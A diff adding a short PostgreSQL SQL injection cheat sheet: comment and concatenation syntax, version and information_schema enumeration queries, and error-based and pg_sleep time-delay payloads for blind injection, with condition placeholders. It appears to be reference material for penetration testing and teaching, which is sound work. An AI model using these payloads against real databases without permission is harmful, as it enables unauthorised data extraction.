@@ -1,0 +1,25 @@
+String concatenation
+'foo'||'bar'
+
+Substring
+SUBSTRING('foobar', 4, 2)
+
+Comments
+--comment
+/*comment*/
+
+Database version
+SELECT version()
+
+Database contents
+SELECT * FROM information_schema.tables
+SELECT * FROM information_schema.columns WHERE table_name = 'TABLE_NAME_HERE'
+
+Conditional errors
+SELECT CASE WHEN (YOUR_CONDITION_HERE) THEN cast(1/0 as text) ELSE NULL END
+
+Time delays
+SELECT pg_sleep(10)
+
+Conditional time delays
+SELECT CASE WHEN (YOUR_CONDITION_HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END
